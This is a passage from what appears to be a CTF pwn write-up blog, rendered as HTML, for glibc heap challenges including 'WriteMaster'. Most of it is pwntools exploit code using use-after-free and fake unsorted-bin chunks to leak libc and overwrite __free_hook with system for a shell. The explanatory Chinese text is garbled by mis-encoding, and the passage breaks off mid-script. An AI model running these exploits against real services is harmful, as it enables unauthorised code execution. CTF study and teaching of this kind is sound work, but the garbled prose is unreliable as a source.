class="line">    <span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    cmd =<span class="string">&#x27;set follow-fork-mode parent\n&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pie:</span><br><span class="line">        base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;|awk &#x27;&#123;&#123;print ./null&#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(io.pid)).readlines()[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">        cmd +=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b+base) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">        cmd +=<span class="string">&#x27;set base=&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(base)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cmd+=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line"></span><br><span class="line">_add,_free,_edit,_show = <span class="number">1</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line"></span><br><span class="line">menu = <span class="string">&quot;choide:&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size, content</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_add))</span><br><span class="line">    sla(<span class="string">&quot;size:&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&quot;content:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_edit))</span><br><span class="line">    sla(<span class="string">&quot;index:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">&quot;content:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_free))</span><br><span class="line">    sla(<span class="string">&quot;index:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_show))</span><br><span class="line">    sla(<span class="string">&quot;index:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    add(<span class="number">0x410</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment"># 0</span></span><br><span class="line">    add(<span class="number">0x108</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment"># 1</span></span><br><span class="line">    add(<span class="number">0x28</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment"># 2</span></span><br><span class="line">    add(<span class="number">0x4f0</span>, <span class="string">&#x27;b&#x27;</span>) <span class="comment"># 3</span></span><br><span class="line">    add(<span class="number">0x10</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>) <span class="comment"># 4</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">2</span>, <span class="number">0x20</span> * <span class="string">&#x27;a&#x27;</span> + p64(<span class="number">0x560</span>))</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    add(<span class="number">0x410</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment"># 0</span></span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    leak = uu64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]) - <span class="number">1482</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    echo(<span class="string">&#x27;libc base:&#x27;</span> + <span class="built_in">hex</span>(leak))</span><br><span class="line">    libc.address = leak</span><br><span class="line">    __free_hook = libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    system = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    add(<span class="number">0x108</span>, <span class="string">&#x27;3&#x27;</span>) <span class="comment"># 3</span></span><br><span class="line">    add(<span class="number">0x108</span>, <span class="string">&#x27;5&#x27;</span>) <span class="comment"># 5</span></span><br><span class="line">    free(<span class="number">5</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">3</span>, p64(__free_hook) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x108</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment"># 1</span></span><br><span class="line">    add(<span class="number">0x108</span>, p64(system)) <span class="comment"># 5</span></span><br><span class="line">    free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h3 id="WriteMaster"><a href="#WriteMaster" class="headerlink" title="WriteMaster"></a>WriteMaster</h3><h4 id="æˆ‘æƒ³åˆ†äº«çš„ä¸€äº›åˆ†ææŠ€å·§"><a href="#æˆ‘æƒ³åˆ†äº«çš„ä¸€äº›åˆ†ææŠ€å·§" class="headerlink" title="æˆ‘æƒ³åˆ†äº«çš„ä¸€äº›åˆ†ææŠ€å·§"></a>æˆ‘æƒ³åˆ†äº«çš„ä¸€äº›åˆ†ææŠ€å·§</h4><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1guzy318nhvj61br0u0q9m02.jpg" alt=""></p><p>åœ¨addå‡½æ•°ä¸­ç¬¬ä¸€çœ¼çœ‹è¿‡å»å¾ˆä¹±ï¼ŒçŒœæµ‹ç”³è¯·äº†å¾ˆå¤šç»“æ„ä½“ä»€ä¹ˆçš„ï¼Œè¿™ä¸ªæ—¶å€™æœ‰ç»éªŒçš„å¸ˆå‚…ç¡¬çœ‹å¾ˆå¥½åˆ†æï¼Œä½†æ˜¯å¯¹äºæˆ‘ä»¬æ¥è¯´è¦å­¦ä¼šå·é¸¡ï¼Œè¿è¡Œä¸€ä¸‹ç¨‹åºçœ‹çœ‹åˆ°åº•æ˜¯å¹²å•¥çš„</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1guzy5etqpsj610g0nmgn102.jpg" alt=""></p><p>çœ‹åˆ°å…ˆåè¾“å…¥äº†indexï¼ˆåœ¨çº¢æ¡†æ¡†çš„ä¸Šé¢ï¼Œæ‡’å¾—é‡æ–°æˆªå›¾äº†ï¼‰ï¼Œheader sizeï¼Œheaderï¼Œtext sizeå’Œtextï¼Œç„¶åæ‰¾æ‰¾addå‡½æ•°ä¸­çš„ä¸€å †exitä¿¡æ¯ä¸­éƒ½è¾“å‡ºäº†å­—ç¬¦ä¸²ï¼Œidaä¸­çœ‹çœ‹</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1guzy8nhz28j61e60ngq9z02.jpg" alt=""></p><p>ç»“åˆé¢˜ç›®åå­—å¤§æ¦‚èƒ½å¤ŸçŒœå‡ºæ¥æ˜¯ä¸€ä¸ªæ–‡ç« ç®¡ç†çš„ä¸œè¥¿ï¼Œèƒ½å¤Ÿå†™æ ‡é¢˜ï¼Œå†™æ–‡ç« æ­£æ–‡ï¼Œåæ­£ä¸šåŠ¡å°±æ˜¯è¿™ä¹ˆä¸ªä¸šåŠ¡ï¼Œé€»è¾‘å°±æ˜¯è¿™ä¹ˆä¸ªé€»è¾‘ï¼Œå®åœ¨ä¸è¡Œgdbä¸€é¡¿åŠ¨è°ƒä¹Ÿèƒ½å‘ç°å„ä¸ªchunkä¹‹é—´çš„è¡”æ¥å…³ç³»ã€‚</p><p>æ‰€ä»¥å…ˆéšä¾¿å†™ä¸ªç»“æ„ä½“çœ‹çœ‹</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Article</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">size_t</span> header_size;</span><br><span class="line">  <span class="keyword">char</span>* header;</span><br><span class="line">  <span class="keyword">size_t</span> text_size;</span><br><span class="line">  <span class="keyword">char</span>* content;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1guzyn5t16rj60uh0u00yh02.jpg" alt=""></p><p>åœ¨idaä¸­æ‰¾åˆ°local types</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1guzyook15qj61cs0p877b02.jpg" alt=""></p><p>å¯¼å…¥ç»“æ„ä½“ï¼Œç„¶åæ›´æ”¹bssä¸­çš„å˜é‡202040çš„ç±»å‹ä¸ºarticle</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1guzyq5cnj5j61om0n2gsj02.jpg" alt=""></p><p>çœ‹èµ·æ¥ä»ç„¶ä¸å¤ªå¯¹çš„æ ·å­ï¼Œæ³¨æ„åˆ°æœ‰äºŒçº§æŒ‡é’ˆçš„å­˜åœ¨ï¼ŒçŒœæµ‹æ–‡ç« å¤´æˆ–è€…æ–‡ç« æ­£æ–‡çš„åœ°æ–¹è¿˜æœ‰ä¸€ä¸ªç»“æ„ä½“æŒ‡é’ˆ</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Header</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">size_t</span> header_size;</span><br><span class="line">  <span class="keyword">char</span>* content;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Text</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">size_t</span> text_size;</span><br><span class="line">  <span class="keyword">char</span>* content;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>åˆ†åˆ«å¯¼å…¥åï¼ŒæŒ¨è¾¹è¯•ä¸‹ï¼Œæœ€ç»ˆå¯ä»¥ä¼˜åŒ–æˆå¦‚ä¸‹æ ·å­</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1guzz0q208oj61je0lkgrb02.jpg" alt=""></p><p>æ€»ä¹‹ä¼šæ¯”å—¯å®¡å¥½ç‚¹</p><h4 id="æ­£ç‰‡"><a href="#æ­£ç‰‡" class="headerlink" title="æ­£ç‰‡"></a>æ­£ç‰‡</h4><h5 id="å®Œæ•´exp"><a href="#å®Œæ•´exp" class="headerlink" title="å®Œæ•´exp"></a>å®Œæ•´exp</h5><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv18ihld8cj60si0hs76t02.jpg" alt=""></p><p>æ˜æ˜¾çš„UAFæ¼æ´</p><p>åªèƒ½ç”³è¯·å°äº0x60çš„chunkï¼Œè¾“å…¥666æœ‰ä¸ªåé—¨å¯ä»¥editä¸¤æ¬¡ï¼Œå¦‚æœä¸æ˜¯é™åˆ¶äº†chunkçš„å¤§å°å°±æ˜¯ç™½ç»™é¢˜</p><p>å› ä¸ºæ˜¯uafï¼Œæ‹¿åˆ°å †åœ°å€è½»è½»æ¾æ¾ï¼Œé€šè¿‡uafçš„å¸ƒå±€ä¼ªé€ å‡ºubï¼Œç„¶åæ³„éœ²å‡ºå †åœ°å€å’Œlibcçš„åœ°å€ï¼Œæœ€ååŠ«æŒfreehookæ¥getshellï¼Œå®Œæ•´expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">arch =  <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&quot;./WriterMaster&quot;</span></span><br><span class="line">libc_path_local = <span class="string">&quot;/glibc/x64/1.4_2.27/libc.so.6&quot;</span></span><br><span class="line">libc_path_remote = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-hp&#x27;</span>, <span class="string">&#x27;65&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    <span class="keyword">if</span> libc_path_local:</span><br><span class="line">        io = process(challenge,env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:libc_path_local&#125;)</span><br><span class="line">        libc = ELF(libc_path_local)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">25965</span>)</span><br><span class="line">    <span class="keyword">if</span> libc_path_remote:</span><br><span class="line">        libc = ELF(libc_path_remote)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch == <span class="number">64</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> arch == <span class="number">32</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">content</span>):</span></span><br><span class="line">    print(<span class="string">&quot;\033[4;36;40mOutput prompts:\033[0m&quot;</span> + <span class="string">&quot;\t\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + content + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line">p   = <span class="keyword">lambda</span>      : pause() </span><br><span class="line">s   = <span class="keyword">lambda</span> x    : success(x)</span><br><span class="line">re  = <span class="keyword">lambda</span> m, t : io.recv(numb=m, timeout=t)</span><br><span class="line">ru  = <span class="keyword">lambda</span> x    : io.recvuntil(x)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : io.recvline()</span><br><span class="line">sd  = <span class="keyword">lambda</span> x    : io.send(x)</span><br><span class="line">sl  = <span class="keyword">lambda</span> x    : io.sendline(x)</span><br><span class="line">ia  = <span class="keyword">lambda</span>      : io.interactive()</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b : io.sendlineafter(a, b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a, b : io.sendafter(a, b)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">bps = []</span><br><span class="line">pie = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gdba</span>():</span></span><br><span class="line">    <span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    cmd =<span class="string">&#x27;set follow-fork-mode parent\n&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pie:</span><br><span class="line">        base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;|awk &#x27;&#123;&#123;print ./WriteMaster&#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(io.pid)).readlines()[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">        cmd +=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b+base) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">        cmd +=<span class="string">&#x27;set base=&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(base)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cmd+=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line"></span><br><span class="line">_add,_free,_show,_edit = <span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">666</span></span><br><span class="line"></span><br><span class="line">menu = <span class="string">&quot;:&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx, header, size, content</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_add))</span><br><span class="line">    sla(<span class="string">&quot;index:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;header size:&quot;</span>, <span class="built_in">str</span>(<span class="number">0x20</span>))</span><br><span class="line">    sa(<span class="string">&quot;header:&quot;</span>, header)</span><br><span class="line">    sla(<span class="string">&quot;text size:&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&quot;content:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_free))</span><br><span class="line">    sla(<span class="string">&quot;index:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_show))</span><br><span class="line">    sla(<span class="string">&quot;index:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_edit))</span><br><span class="line">    sla(<span class="string">&quot;index:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">&#x27;text:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    add(<span class="number">0</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, (p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)) * (<span class="number">0x60</span> / <span class="number">0x10</span>))</span><br><span class="line">    add(<span class="number">1</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">    add(<span class="number">2</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">    add(<span class="number">3</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">    add(<span class="number">4</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">    add(<span class="number">5</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">    add(<span class="number">6</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, (p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)) * (<span class="number">0x60</span> / <span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">6</span>):</span><br><span class="line">        free(i)</span><br><span class="line">    </span><br><span class="line">    show(<span class="number">5</span>)</span><br><span class="line">    ru(<span class="string">&#x27;text:&#x27;</span>)</span><br><span class="line">    heap = uu64(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)[-<span class="number">6</span>:]) &amp; <span class="number">0xfffffffff000</span></span><br><span class="line">    echo(<span class="string">&#x27;HEAP BASE:&#x27;</span> + <span class="built_in">hex</span>(heap))</span><br><span class="line">    edit(<span class="number">3</span>, p64(heap + <span class="number">0x2c0</span> + <span class="number">0x50</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        add(<span class="number">7</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">7</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x60</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0x10</span>) + p64(heap) +  p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + <span class="string">&#x27;a&#x27;</span> * <span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x431</span>))</span><br><span class="line"></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    leak = uu64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]) - <span class="number">96</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    echo(<span class="string">&#x27;LIBC BASE:&#x27;</span> + <span class="built_in">hex</span>(leak))</span><br><span class="line">    libc.address = leak</span><br><span class="line">    __free_hook = libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    system = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    add(<span class="number">12</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x30</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">13</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x30</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    free(<span class="number">13</span>)</span><br><span class="line">    free(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">12</span>, p64(__free_hook))</span><br><span class="line">    add(<span class="number">13</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x30</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    add(<span class="number">1</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x30</span>, p64(system))</span><br><span class="line">    free(<span class="number">13</span>)</span><br><span class="line">    <span class="comment"># gdba()</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h5 id="ä¼ªé€ ubè¯¦è§£"><a href="#ä¼ªé€ ubè¯¦è§£" class="headerlink" title="ä¼ªé€ ubè¯¦è§£"></a>ä¼ªé€ ubè¯¦è§£</h5><p>ç¨‹åºä¸­è¿˜æœ‰ä¸ªå°æ¼æ´ï¼Œå°±æ˜¯addçš„æ—¶å€™indexå¯ä»¥ç”±æˆ‘ä»¬è‡ªå·±æ¥æŒ‡å®šï¼Œè¿™æ ·å°±é€ æˆäº†ä¹‹å‰å†™è¿‡çš„åœ¨å†…å­˜ä¸­çš„æ•°æ®å¯èƒ½ä¼šè¢«è¦†ç›–ï¼Œæ‰€ä»¥æå¤§å¢å¼ºäº†æˆ‘ä»¬çš„ä½“éªŒï¼Œæƒ³æ€ä¹ˆæ‰“éƒ½å¯ä»¥ï¼Œè€ƒçš„ç‚¹å°±æ˜¯å¦‚ä½•ä¼ªé€ å‡ºæ¥ä¸€å—ubï¼Œé‚£ä¹ˆè¯¦ç»†è®°å½•ä¸‹</p><p>æˆ‘æ˜¯è¾¹åšè¾¹ç»™å¸¦ğŸ”¥å†™çš„wpï¼Œé¦–å…ˆå†™éšä¾¿ç”³è¯·ä¸€é€šchunkï¼Œåœ¨chunk0ä¸­ä¼ªé€ ä¸€ä¸ªå‡çš„headerï¼Œæ—¥åå¯ä»¥è¦†ç›–chunk1çš„header</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>))</span><br><span class="line">add(<span class="number">1</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">6</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">6</span>):</span><br><span class="line">    free(i)</span><br></pre></td></tr></table></figure><p><img src="/Users/lemon/Library/Application%20Support/typora-user-images/image-20211002165852836.png" alt=""></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">show(<span class="number">5</span>)</span><br><span class="line">ru(<span class="string">&#x27;text:&#x27;</span>)</span><br><span class="line">heap = uu64(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)[-<span class="number">6</span>:]) &amp; <span class="number">0xfffffffff000</span></span><br><span class="line">echo(<span class="string">&#x27;HEAP BASE:&#x27;</span> + <span class="built_in">hex</span>(heap))</span><br><span class="line">edit(<span class="number">3</span>, p64(heap + <span class="number">0x2b0</span>))</span><br></pre></td></tr></table></figure><p>æ³„éœ²å‡ºå †åœ°å€åï¼Œæ”¹ä¸ªfdä¸ºä¹‹å‰ä¼ªé€ çš„header</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv12qeb61bj612a04s3z702.jpg" alt=""></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    add(<span class="number">7</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x50</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x431</span>))</span><br></pre></td></tr></table></figure><p>å…¨éƒ¨ç”³è¯·å›æ¥ï¼Œæœ€ç»ˆä¼šç”³è¯·åˆ°fake chunkï¼Œç„¶åé¡ºåŠ¿æŠŠä¸‹ä¸€ä¸ªchunkçš„headerç»™ğŸ‘äº†</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv152umtcrj61b40awwgo02.jpg" alt=""></p><p>å°±åƒè¿™ä¸ªæ ·ï¼Œè¿™æ ·å°±æœ‰unsorted binï¼ˆä¸‹æ–‡è®°ä¸ºubï¼‰å¯ä»¥ç”¨äº†ï¼Œä½†æ˜¯freeçš„æ—¶å€™è¿˜è¦ä¼ªé€ ubçš„ä¸‹ä¸€ä¸ªchunkçš„headerè¦ä¸ç„¶è¿‡ä¸äº†checkï¼Œæ‰‹ç®—ä¸€æ³¢åç§»ï¼Œå¤§æ¦‚åœ¨æœ€åº•éƒ¨çš„chunké™„è¿‘ï¼Œæ‰€ä»¥æŠŠä¹‹å‰çš„expç¨å¾®æ”¹æ”¹ï¼Œ6å·chunkçš„å†…å®¹å…¨æ”¹ä¸ºåˆæ³•çš„headerï¼Œç›®å‰ä¸ºæ­¢expé•¿è¿™æ ·ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>))</span><br><span class="line">add(<span class="number">1</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span 